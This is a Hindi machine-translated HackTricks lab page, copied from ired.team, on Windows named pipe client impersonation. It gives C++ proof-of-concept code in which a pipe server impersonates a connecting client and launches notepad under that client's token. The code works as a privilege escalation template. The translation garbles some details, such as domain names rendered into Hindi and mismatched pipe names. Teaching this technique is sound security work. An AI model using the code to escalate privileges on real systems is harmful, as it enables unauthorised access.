# नामित पाइप क्लाइंट अनुकरण

## नामित पाइप क्लाइंट अनुकरण

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को**

</details>

**यह जानकारी कॉपी की गई है** [**https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation**](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)

## अवलोकन

`पाइप` एक साझा मेमोरी ब्लॉक है जिसे प्रक्रियाएँ संचार और डेटा विनिमय के लिए उपयोग कर सकती हैं।

`नामित पाइप` एक Windows मेकेनिज़्म है जो दो असंबंधित प्रक्रियाओं को एक-दूसरे के बीच डेटा विनिमय करने की सुविधा प्रदान करता है, यद्यपि प्रक्रियाएँ दो अलग-अलग नेटवर्कों पर स्थित हों। यह क्लाइंट/सर्वर आर्किटेक्चर के रूप में बहुत ही समान है क्योंकि `नामित पाइप सर्वर` और `नामित पाइप क्लाइंट` जैसे धारणाएँ मौजूद होती हैं।

नामित पाइप सर्वर एक पहले से निर्धारित नाम के साथ एक नामित पाइप खोल सकता है और फिर एक नामित पाइप क्लाइंट उस पाइप से जुड़ सकता है जानते हुए। एक बार जब कनेक्शन स्थापित हो जाता है, डेटा विनिमय शुरू हो सकता है।

यह लैब एक सरल PoC कोड के साथ संबंधित है जो निम्नलिखित कार्य करने की अनुमति देता है:

* एक single-threaded dumb नामित पाइप सर्वर बनाना जो एक क्लाइंट कनेक्शन स्वीकार करेगा
* नामित पाइप सर्वर को नामित पाइप पर एक सरल संदेश लिखने के लिए ताकि पाइप क्लाइंट उसे पढ़ सके

## कोड

नीचे सर्वर और क्लाइंट के लिए PoC है:
```cpp
#include "pch.h"
#include <Windows.h>
#include <iostream>

int main() {
LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
LPVOID pipeBuffer = NULL;
HANDLE serverPipe;
DWORD readBytes = 0;
DWORD readBuffer = 0;
int err = 0;
BOOL isPipeConnected;
BOOL isPipeOpen;
wchar_t message[] = L"HELL";
DWORD messageLenght = lstrlen(message) * 2;
DWORD bytesWritten = 0;

std::wcout << "Creating named pipe " << pipeName << std::endl;
serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
if (isPipeConnected) {
std::wcout << "Incoming connection to " << pipeName << std::endl;
}

std::wcout << "Sending message: " << message << std::endl;
WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);

return 0;
}
```
{% tab title="namedPipeClient.cpp" %}

```cpp
#include <windows.h>
#include <stdio.h>

#define PIPE_NAME L"\\\\.\\pipe\\MyNamedPipe"

int main()
{
    HANDLE hPipe;
    DWORD dwBytesRead;
    char buffer[1024];

    // Connect to the named pipe
    hPipe = CreateFile(PIPE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE)
    {
        printf("Failed to connect to the named pipe. Error code: %d\n", GetLastError());
        return 1;
    }

    // Read data from the named pipe
    if (ReadFile(hPipe, buffer, sizeof(buffer), &dwBytesRead, NULL))
    {
        printf("Received data from the named pipe: %s\n", buffer);
    }
    else
    {
        printf("Failed to read data from the named pipe. Error code: %d\n", GetLastError());
    }

    // Close the named pipe
    CloseHandle(hPipe);

    return 0;
}
```

{% endtab %}

{% tab title="namedPipeClient.cpp" %}
```cpp
#include "pch.h"
#include <iostream>
#include <Windows.h>

const int MESSAGE_SIZE = 512;

int main()
{
LPCWSTR pipeName = L"\\\\10.0.0.7\\pipe\\mantvydas-first-pipe";
HANDLE clientPipe = NULL;
BOOL isPipeRead = true;
wchar_t message[MESSAGE_SIZE] = { 0 };
DWORD bytesRead = 0;

std::wcout << "Connecting to " << pipeName << std::endl;
clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

while (isPipeRead) {
isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
std::wcout << "Received message: " << message;
}

return 0;
}
```
{% endtab %}
{% endtabs %}

## निष्पादन

नीचे दिखाया गया है कि नामित पाइप सर्वर और नामित पाइप क्लाइंट उम्मीद के अनुसार काम कर रहे हैं:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22.png>)

यह ध्यान देने योग्य है कि नामित पाइप्स संचार डिफ़ॉल्ट रूप से SMB प्रोटोकॉल का उपयोग करते हैं:

![](<../../.gitbook/assets/Screenshot from 2019-04-04 23-51-48.png>)

हम देख सकते हैं कि प्रक्रिया हमारे नामित पाइप `mantvydas-first-pipe` के लिए एक हैंडल बनाए रखती है:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (1).png>)

इसी तरह, हम देख सकते हैं कि क्लाइंट के पास नामित पाइप के लिए एक खुला हुआ हैंडल है:

![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (2).png>)

हम पावरशेल के साथ अपनी पाइप भी देख सकते हैं:
```csharp
((Get-ChildItem \\.\pipe\).name)[-1..-5]
```
![](<../../.gitbook/assets/Screenshot from 2019-04-02 23-44-22 (3).png>)

## टोकन अनुकरण

{% hint style="info" %}
ध्यान दें कि नामित पाइप सर्वर को (पाइप बनाने वाली सर्वर प्रक्रिया) नामित पाइप क्लाइंट के सुरक्षा संदर्भ का अनुकरण करने के लिए आपके पास **`SeImpersonate`** टोकन विशेषाधिकार होना चाहिए।
{% endhint %}

नामित पाइप सर्वर को नामित पाइप क्लाइंट के सुरक्षा संदर्भ को अनुकरण करने के लिए `ImpersonateNamedPipeClient` API कॉल का उपयोग किया जा सकता है, जिससे नामित पाइप सर्वर के वर्तमान धागे का टोकन नामित पाइप क्लाइंट के टोकन के साथ परिवर्तित हो जाता है।

हम नामित पाइप सर्वर को अनुकरण करने के लिए निम्नलिखित तरीके से कोड अपडेट कर सकते हैं - ध्यान दें कि संशोधन लाइन 25 और उसके बाद में दिखाई देते हैं:
```cpp
int main() {
LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
LPVOID pipeBuffer = NULL;
HANDLE serverPipe;
DWORD readBytes = 0;
DWORD readBuffer = 0;
int err = 0;
BOOL isPipeConnected;
BOOL isPipeOpen;
wchar_t message[] = L"HELL";
DWORD messageLenght = lstrlen(message) * 2;
DWORD bytesWritten = 0;

std::wcout << "Creating named pipe " << pipeName << std::endl;
serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
if (isPipeConnected) {
std::wcout << "Incoming connection to " << pipeName << std::endl;
}

std::wcout << "Sending message: " << message << std::endl;
WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);

std::wcout << "Impersonating the client..." << std::endl;
ImpersonateNamedPipeClient(serverPipe);
err = GetLastError();

STARTUPINFO	si = {};
wchar_t command[] = L"C:\\Windows\\system32\\notepad.exe";
PROCESS_INFORMATION pi = {};
HANDLE threadToken = GetCurrentThreadToken();
CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

return 0;
}
```
सर्वर को चलाने और उससे कनेक्ट करने के लिए क्लाइंट को उच्चाधिकारी@अपराध.local सुरक्षा संदर्भ के तहत चलाते हैं, हम देख सकते हैं कि नामित सर्वर पाइप का मुख्य थ्रेड नामित पाइप क्लाइंट - अपराध\उच्चाधिकारी के टोकन को अस्सुम करता है, हालांकि PipeServer.exe इसी के तहत ws01\मंत्व्यदास सुरक्षा संदर्भ में चल रहा है। यह उच्चाधिकार प्राप्त करने का एक अच्छा तरीका लगता है?
